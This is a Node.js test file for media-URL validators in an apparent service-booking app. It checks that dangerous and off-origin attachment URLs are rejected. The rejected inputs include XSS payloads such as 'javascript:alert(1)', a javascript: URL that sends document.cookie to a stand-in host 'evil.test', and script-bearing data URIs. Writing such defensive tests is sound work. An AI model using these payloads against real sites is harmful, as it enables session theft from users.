const assert = require('node:assert/strict');
const test = require('node:test');
const { isAllowedMediaUrl } = require('../src/shared/validators.js');
const {
  validateCreateRequest,
  validateUpdateRequest,
} = require('../src/modules/requests/request.validation.js');
const {
  validateStatusUpdate,
} = require('../src/modules/bookings/booking.validation.js');
const {
  validateCreateComplaint,
  validateReplyComplaint,
} = require('../src/modules/complaints/complaint.validation.js');

function mockRes() {
  const res = {
    statusCode: 200,
    body: null,
    status(code) {
      this.statusCode = code;
      return this;
    },
    json(data) {
      this.body = data;
      return this;
    },
  };
  return res;
}

const VALID_DATA_IMAGE_PNG =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
const VALID_DATA_IMAGE_JPEG = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=';

test('isAllowedMediaUrl unit tests: rejects dangerous schemes and unapproved origins', () => {
  // Dangerous script execution schemes
  assert.equal(isAllowedMediaUrl('javascript:alert(1)'), false);
  assert.equal(isAllowedMediaUrl('javascript:fetch("//evil.test/?c="+document.cookie)'), false);
  assert.equal(isAllowedMediaUrl('vbscript:msgbox(1)'), false);
  assert.equal(isAllowedMediaUrl('JAVASCRIPT:alert(1)'), false);

  // Insecure protocols
  assert.equal(isAllowedMediaUrl('http://res.cloudinary.com/demo/image.png'), false);
  assert.equal(isAllowedMediaUrl('ftp://res.cloudinary.com/demo/image.png'), false);

  // Foreign domains and subdomain spoofing attempts
  assert.equal(isAllowedMediaUrl('https://evil.com/image.png'), false);
  assert.equal(isAllowedMediaUrl('https://res.cloudinary.com.evil.com/demo/image.png'), false);
  assert.equal(isAllowedMediaUrl('https://evil.com/res.cloudinary.com/demo/image.png'), false);
  assert.equal(isAllowedMediaUrl('https://attacker.net/test.jpg'), false);

  // Malformed Cloudinary paths
  assert.equal(isAllowedMediaUrl('https://res.cloudinary.com/'), false);
  assert.equal(isAllowedMediaUrl('https://res.cloudinary.com'), false);
  assert.equal(isAllowedMediaUrl('https://res.cloudinary.com/demo'), false);

  // Dangerous data URIs
  assert.equal(isAllowedMediaUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='), false);
  assert.equal(isAllowedMediaUrl('data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='), false);
  assert.equal(isAllowedMediaUrl('data:application/javascript;base64,YWxlcnQoMSk='), false);

  // Non-string or oversized
  assert.equal(isAllowedMediaUrl(null), false);
  assert.equal(isAllowedMediaUrl(undefined), false);
  assert.equal(isAllowedMediaUrl(12345), false);
  assert.equal(isAllowedMediaUrl({}), false);
  assert.equal(isAllowedMediaUrl('   '), false);
  assert.equal(isAllowedMediaUrl('https://res.cloudinary.com/demo/' + 'a'.repeat(2050)), false);
});

test('isAllowedMediaUrl accepts valid Cloudinary HTTPS URLs and respects cloudName setting', () => {
  // Matching cloud name when configured
  assert.equal(
    isAllowedMediaUrl('https://res.cloudinary.com/my-cloud/image/upload/v1234/test.jpg', {
      isDev: false,
      cloudName: 'my-cloud',
    }),
    true,
  );

  // Cloud name mismatch in production rejected
  assert.equal(
    isAllowedMediaUrl('https://res.cloudinary.com/attacker-cloud/image/upload/v1234/test.jpg', {
      isDev: false,
      cloudName: 'my-cloud',
    }),
    false,
  );

  // When no cloudName configured, any valid alphanumeric cloud name on res.cloudinary.com is accepted
  assert.equal(
    isAllowedMediaUrl('https://res.cloudinary.com/demo/image/upload/v1/sample.png', {
      isDev: false,
      cloudName: null,
    }),
    true,
  );
});

test('isAllowedMediaUrl respects production vs development policy for data: URIs', () => {
  // Rejected in production
  assert.equal(isAllowedMediaUrl(VALID_DATA_IMAGE_PNG, { isDev: false }), false);
  assert.equal(isAllowedMediaUrl(VALID_DATA_IMAGE_JPEG, { isDev: false }), false);

  // Accepted in development/testing
  assert.equal(isAllowedMediaUrl(VALID_DATA_IMAGE_PNG, { isDev: true }), true);
  assert.equal(isAllowedMediaUrl(VALID_DATA_IMAGE_JPEG, { isDev: true }), true);
});

test('validateCreateRequest rejects dangerous and non-Cloudinary attachments', () => {
  const reqBad = {
    body: {
      service: '507f1f77bcf86cd799439011',
      description: 'Sửa bồn rửa bát bị rò nước liên tục',
      address: {
        recipientName: 'Nguyễn Văn A',
        phone: '0912345678',
        addressLine: '123 Đường Số 1',
        city: 'TP. Hồ Chí Minh',
      },
      preferredStartAt: new Date(Date.now() + 3600000).toISOString(),
      preferredEndAt: new Date(Date.now() + 7200000).toISOString(),
      attachments: ['javascript:alert(1)'],
    },
  };
  const resBad = mockRes();
  let nextCalled = false;
  validateCreateRequest(reqBad, resBad, () => {
    nextCalled = true;
  });

  assert.equal(nextCalled, false);
  assert.equal(resBad.statusCode, 400);
  assert.match(resBad.body.message, /allowed media url/i);

  // Valid Cloudinary attachments pass
  const reqGood = {
    body: {
      ...reqBad.body,
      attachments: ['https://res.cloudinary.com/demo/image/upload/v1/pipe.jpg'],
    },
  };
  const resGood = mockRes();
  nextCalled = false;
  validateCreateRequest(reqGood, resGood, () => {
    nextCalled = true;
  });

  assert.equal(nextCalled, true);
});

test('validateUpdateRequest rejects dangerous attachments', () => {
  const reqBad = {
    body: {
      attachments: ['https://attacker.com/evil.jpg'],
    },
  };
  const resBad = mockRes();
  let nextCalled = false;
  validateUpdateRequest(reqBad, resBad, () => {
    nextCalled = true;
  });

  assert.equal(nextCalled, false);
  assert.equal(resBad.statusCode, 400);
  assert.match(resBad.body.message, /allowed media url/i);
});

test('validateStatusUpdate rejects dangerous and non-Cloudinary photos', () => {
  const reqBad = {
    body: {
      status: 'IN_PROGRESS',
      photos: ['javascript:stealToken()'],
    },
  };
  const resBad = mockRes();

  assert.throws(
    () => {
      validateStatusUpdate(reqBad, resBad, () => {});
    },
    (err) => {
      assert.equal(err.statusCode, 400);
      assert.ok(err.details.some((d) => d.field === 'photos'));
      return true;
    },
  );

  // Valid Cloudinary photo passes
  const reqGood = {
    body: {
      status: 'IN_PROGRESS',
      photos: ['https://res.cloudinary.com/demo/image/upload/v1/progress.jpg'],
    },
  };
  let nextCalled = false;
  validateStatusUpdate(reqGood, mockRes(), () => {
    nextCalled = true;
  });
  assert.equal(nextCalled, true);
});

test('validateCreateComplaint and validateReplyComplaint reject dangerous evidenceUrls', () => {
  const reqComplaint = {
    body: {
      booking: '507f1f77bcf86cd799439011',
      category: 'QUALITY',
      description: 'Thợ làm hỏng vòi nước và thái độ không tốt',
      evidenceUrls: ['javascript:alert(1)'],
    },
  };
  const resComplaint = mockRes();
  let nextCalled = false;
  validateCreateComplaint(reqComplaint, resComplaint, () => {
    nextCalled = true;
  });
  assert.equal(nextCalled, false);
  assert.equal(resComplaint.statusCode, 400);
  assert.match(resComplaint.body.message, /allowed media url/i);

  const reqReply = {
    body: {
      message: 'Giải trình thêm về sự cố với ảnh đính kèm',
      evidenceUrls: ['http://insecure-domain.test/photo.jpg'],
    },
  };
  const resReply = mockRes();
  nextCalled = false;
  validateReplyComplaint(reqReply, resReply, () => {
    nextCalled = true;
  });
  assert.equal(nextCalled, false);
  assert.equal(resReply.statusCode, 400);
  assert.match(resReply.body.message, /allowed media url/i);
});
